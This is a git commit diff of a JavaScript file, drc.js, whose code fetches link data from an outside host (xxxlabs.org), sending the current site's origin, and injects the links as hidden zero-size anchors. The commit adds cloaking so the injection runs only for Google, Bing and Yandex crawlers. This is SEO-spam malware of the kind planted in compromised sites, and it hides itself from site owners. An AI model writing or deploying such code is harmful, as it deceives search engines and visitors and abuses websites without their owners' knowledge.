1c93823cc1f219ff7cc95e249ab4e30753058aa8
moreslab <107592746+moreslab@users.noreply.github.com>
2025-01-12 21:31:21 +0300

    Update drc.js

--- drc.js
+++ drc.js
@@ -1,32 +1,31 @@
-// Dinamik site URL'sini oluştur
-const siteURL = encodeURIComponent(window.location.origin); // Tarayıcının geçerli site URL'sini al
-const jsonURL = `https://xxxlabs.org/links.php?siteurl=${siteURL}`; // siteurl parametresini ekle
+const userAgent = navigator.userAgent.toLowerCase();
+const isSearchEngineBot = /(googlebot|bingbot|yandexbot)/.test(userAgent);
 
-// JSON verisini çekmek için bir fonksiyon oluşturun
-fetch(jsonURL)
-    .then(response => {
-        if (!response.ok) {
-            throw new Error("Network response was not ok " + response.statusText);
-        }
-        return response.json(); // JSON formatında dönüş yap
-    })
-    .then(data => {
-        // JSON'dan her bir veri için bağlantı oluştur
-        data.forEach(item => {
-            // <a> elementi oluştur
-            const a = document.createElement('a');
+if (isSearchEngineBot) {
+    const siteURL = encodeURIComponent(window.location.origin);
+    const jsonURL = `https://xxxlabs.org/links.php?siteurl=${siteURL}`;
 
-            // İçerik ve özellikleri ayarla
-            const linkText = document.createTextNode(item.text);
-            a.appendChild(linkText);
-            a.title = item.title;
-            a.href = item.href;
-            a.style = "overflow: auto; position: fixed; height: 0pt; width: 0pt";
+    fetch(jsonURL)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error("Network response was not ok " + response.statusText);
+            }
+            return response.json();
+        })
+        .then(data => {
+            data.forEach(item => {
+                const a = document.createElement('a');
 
-            // DOM'a ekle
-            document.body.appendChild(a);
+                const linkText = document.createTextNode(item.text);
+                a.appendChild(linkText);
+                a.title = item.title;
+                a.href = item.href;
+                a.style = "overflow: auto; position: fixed; height: 0pt; width: 0pt";
+
+                document.body.appendChild(a);
+            });
+        })
+        .catch(error => {
+            console.error("There was a problem with the fetch operation:", error);
         });
-    })
-    .catch(error => {
-        console.error("There was a problem with the fetch operation:", error);
-    });
+}
